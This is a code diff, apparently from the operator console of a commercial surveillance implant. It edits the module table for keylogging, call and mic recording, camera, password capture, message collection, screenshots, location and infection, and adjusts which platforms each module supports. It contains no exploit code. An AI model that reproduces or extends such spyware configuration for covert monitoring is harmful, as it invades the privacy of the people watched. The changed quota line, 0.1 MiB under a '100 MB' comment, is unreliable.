@@ -44,17 +44,17 @@ package it.ht.rcs.console
 
 				{module: "application", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
-				{module: "calendar", _type: "desktop,mobile", _platform: "osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
+				{module: "calendar", _type: "desktop,mobile", _platform: "osx,ios,blackberry,winmo,symbian,android,linux"},
 
 				{module: "call", buffer: 512000, compression: 5,
 
-					record: true, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
+					record: true, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
-				{module: "camera", quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,winmo,symbian,linux,winphone"},
+				{module: "camera", quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,winmo,symbian,linux"},
 
-				{module: "chat", _type: "desktop,mobile", _platform: "windows,osx,blackberry,linux,ios,android,winphone"},
+				{module: "chat", _type: "desktop,mobile", _platform: "windows,osx,blackberry,linux,ios,android"},
 
-				{module: "clipboard", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,android,linux,winphone"},
+				{module: "clipboard", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,android,linux"},
 
 				{module: "conference", number: "", _type: "mobile", _platform: "winmo"},
 
@@ -68,25 +68,25 @@ package it.ht.rcs.console
 
 				{module: "infection", local: false, mobile: false, usb: false, vm: 0, factory: "", _type: "desktop", _platform: "windows,linux"},
 
-				{module: "keylog", _type: "desktop,mobile", _platform: "windows,osx,ios,linux,winphone"},
+				{module: "keylog", _type: "desktop,mobile", _platform: "windows,osx,ios,linux"},
 
 				{module: "livemic", number: "", _type: "mobile", _platform: "winmo"},
 
-				{module: "messages", mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}}, sms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, mms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, _type: "desktop,mobile", _platform: "windows,ios,blackberry,symbian,android,linux,winphone"},
+				{module: "messages", mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}}, sms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, mms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, _type: "desktop,mobile", _platform: "windows,ios,blackberry,symbian,android,linux"},
 
 				{module: "mic", threshold: 0.22, silence: 5, autosense: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
 				{module: "mouse", width: 50, height: 50, _type: "desktop", _platform: "windows,osx,linux"},
 
-				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,winphone"},
+				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,android"},
 
 				{module: "position", gps: false, cell: true, wifi: true, _type: "desktop,mobile", _platform: "windows,osx,blackberry,winmo,symbian,android,ios,linux,winphone"},
 
 				//{module: "print", quality: "med", _type: "desktop", _platform: "windows,linux"},
 
-				{module: "screenshot", onlywindow: false, quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
+				{module: "screenshot", onlywindow: false, quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
-				{module: "url", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,linux,winphone"}];
+				{module: "url", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,linux"}];
 
 			if (skipFilter)
 				return modules;
@@ -114,7 +114,7 @@ package it.ht.rcs.console
 
 		private static function getGlobals():Object
 		{
-			var min:Number=agent.type == 'desktop' ? 1000 * Size.MIB : 100 * Size.MIB; // 1 GB, 100 MB
+			var min:Number=agent.type == 'desktop' ? 1000 * Size.MIB : 0.1 * Size.MIB; // 1 GB, 100 MB
 			var max:Number=agent.type == 'desktop' ? 4000 * Size.MIB : 100 * Size.MIB; // 4 GB, 100 MB
 			var globals:Object={quota: {min: min, max: max}, wipe: false, remove_driver: true, nohide: [], type: agent.type, advanced: false, collapsed: false, migrated: false, version: 2012041601};
 
